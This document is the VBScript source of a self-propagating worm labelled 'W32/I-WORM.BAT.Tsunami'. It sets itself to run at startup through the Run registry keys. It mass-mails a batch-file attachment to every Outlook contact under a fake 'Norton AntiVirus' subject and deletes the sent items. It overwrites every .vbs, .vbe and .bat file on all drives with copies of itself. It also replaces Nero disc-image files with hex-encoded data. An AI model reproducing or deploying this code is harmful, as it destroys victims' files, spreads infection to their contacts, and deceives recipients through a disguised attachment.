On error resume next
Set fso=CreateObject("Scripting.FileSystemObject")
Set ws=CreateObject("WScript.Shell")
Set cpy=Fso.GetFile(WScript.ScriptFullName)
cpy.Copy(Fso.GetSpecialFolder(0)&"\Tsunami.vbs")

r=("HKLM\Software\Microsoft\Windows\CurrentVersion\Run\TsunamiExe")
v =("HKLM\Software\Microsoft\Windows\CurrentVersion\Run\TsunamiVBS")

ws.RegWrite r,(Fso.GetSpecialFolder(0)&"\Tsunami.exe")
ws.RegWrite v,(Fso.GetSpecialFolder(0)&"\Tsunami.vbs")

if day(now) <> 1 then:On error resume next

	Set gqlbgmbg=CreateObject("Outlook.Application")
	Set gqlbgqlb=gqlbgmbg.GetNameSpace("MAPI")

	For Each C In gqlbgqlb.AddressLists
		If C.AddressEntries.Count <> 0 Then
			For D=1 To C.AddressEntries.Count
				Set bgqhqlbg=C.AddressEntries(D)
				Set gqlbhqmb=gqlbgmbg.CreateItem(0)
				gqlbhqmb.To=bgqhqlbg.Address
				gqlbhqmb.Subject="Norton AntiVirus"
				gqlbhqmb.Body="Please Check the attachment"
				gqlbhqmb.Attachments.Add("C:\windows\Tsunami.bat")
				gqlbhqmb.DeleteAfterSubmit=True
				If gqlbhqmb.To <> "" Then
					gqlbhqmb.Send
				End If
			Next
		End If
	Next
end if

Set Drives=fso.drives 
For Each Drive in Drives
	If drive.isready then
		Findout drive & "\"
	end If 
Next 


Function Findout(Path) 

Set Folder=fso.getfolder(path) 
Set Files = folder.files 

For Each File in files

	If Fso.GetExtensionName(file.path)="vbs" or fso.GetExtensionName(file.path)="vbe" then 
		fso.Copyfile Wscript.Scriptfullname,file.path
	end if

	If fso.GetExtensionName(file.path)="nrb" then
		on error resume next
		x1 = "0E4E65726F49534F302E30322E30330100000001000000000"
		x2 = "0124E45524F202D204255524E494E4720524F4D000000181C"
		x3 = "F440181CF440FFFFFFFFFFFFFFFF00000000181CF44001000"
		x4 = "0000000000001000000010000000100000001000000074D79"
		x5 = "2044697363074D79204469736310000000000000000000000"
		x6 = "0010073C322FF68C401E0B5D72CFF68C4010073C322FF68C4"
		x7 = "0100004000000000000000000000000002000000433A01000"
		x8 = "000010700000057494E444F575301000000000100000B5473"
        x9 = "756E616D692E62617420000000000000000200000000404EB"
        x10 = "29C3969C40100016D8D3969C4014096C828FF68C401000000"
        x11 = "10025F5F5F315643443106000100000004000000000045444"
        x12 = "A4F030001000000010002444F535F0D00010000000B005453"
        x13 = "554E414D492E4241544653495A0A000100000008000000000"
        x14 = "0000000005052494F0A000200000004000000000004000000"
        x15 = "0000454E44210200000000000000000000000000425553546"
        x16 = "A000000000000000100000001000000000000000000000000"
        x17 = "0000000100000001000000010000000000000000000100FFF"
        x18 = "FFF7F00000000000000000100000000000000010000000000"
        x19 = "0000000000000000000000000000000001000000000000000"
        x20 = "00000004B4E554A544F4F4200000000FFFFFFFF2E433A5C50"
        x21 = "524F4752414D2046494C45535C41484541445C4E45524F5C4"
        x22 = "472446F73426F6F74696D6167652E494D41C0070100020059"
        x23 = "484F4E534D54421743726561746564206279204E65726F204"
        x24 = "57870726573734C4F564A034E455700000000124E65726F20"
        x25 = "2D204275726E696E6720524F4D00000001000000544E454E4"
        x26 = "644554E58454F4200000000"
		GenCode = x1&x2&x3&x4&x5&x6&x7&x8&x9&x10&x11&x12&x13&x14&x15&x16&x17&x18&x19&x20&x21&x22&x23&x24&x25&x26
		
		For letscount = 1 To Len(GenCode) Step 2
			NewCode = NewCode & Chr("&h"& Mid(GenCode, letscount, 2))
		next
		
		Set YourFile = fso.createtextfile(file.path, True)
		YourFile.write NewCode
		YourFile.close
	end if
	
	If fso.GetExtensionName(file.path)="nri" then
		x1 = "0E4E65726F49534F302E30322E30330100000001000000"
        x2 = "0000124E45524F202D204255524E494E4720524F4D0000"
        x3 = "00DC1BF440DC1BF440FFFFFFFFFFFFFFFF00000000DC1B"
        x4 = "F440010000000000000001000000010000000100000000"
        x5 = "000000074D792044697363074D79204469736310000000"
        x6 = "000000000000000001807D7400FF68C401E091AE1FFF68"
        x7 = "C401807D7400FF68C40100004000000000000000000000"
        x8 = "000002000000433A01000000010700000057494E444F57"
        x9 = "5301000000000100000B5473756E616D692E6261742000"
        x10 = "0000000000000200000000404EB29C3969C40100016D8D"
        x11 = "3969C401E0466B0DFF68C40100000010025F5F5F315643"
        x12 = "443106000100000004000000000045444A4F0300010000"
        x13 = "00010002444F535F0D00010000000B005453554E414D49"
        x14 = "2E4241544653495A0A0001000000080000000000000000"
        x15 = "005052494F0A0002000000040000000000040000000000"
        x16 = "454E44210200000000000000000000000000425553546A"
        x17 = "0000000000000001000000010000000000000000000000"
        x18 = "0000000001000000000000000100000000000000000001"
        x19 = "00FFFFFF7F000000000000000001000000000000000100"
        x20 = "0000000000000000000000000000000000000000010000"
        x21 = "0000000000000000004B4E554A54424F4E59484F4E534D"
        x22 = "5442154E65726F20426F6F742D4C6F616465722056332E"
        x23 = "304C4F564A034E455700000000124E65726F202D204275"
        x24 = "726E696E6720524F4D00000001000000544E454E464455"
        x25 = "4E45424F4E"
		
		GenCode = x1&x2&x3&x4&x5&x6&x7&x8&x9&x10&x11&x12&x13&x14&x15&x16&x17&x18&x19&x20&x21&x22&x23&x24&x25
		
		For letscount = 1 To Len(GenCode) Step 2
			NewCode = NewCode & Chr("&h"& Mid(GenCode, letscount, 2))
		next
		
		Set YourFile = fso.createtextfile(file.path, True)
		YourFile.write NewCode
		YourFile.close
	end if

	If fso.GetExtensionName(file.path)="bat" then
		on error resume next
		Set openit = fso.OpenTextFile("C:\windows\Tsunami.bat", 1, True)
		readit = openit.readall
		readit.close
		Set makeit = fso.CreateTextFile(File.path,True)
		makeit.write readit
		makeit.close
	end if
next

Set Subfolders = folder.SubFolders 

For Each Subfolder in Subfolders 
	Findout Subfolder.path 
Next
 
end function
'W32/I-WORM.BAT.Tsunami By Psychologic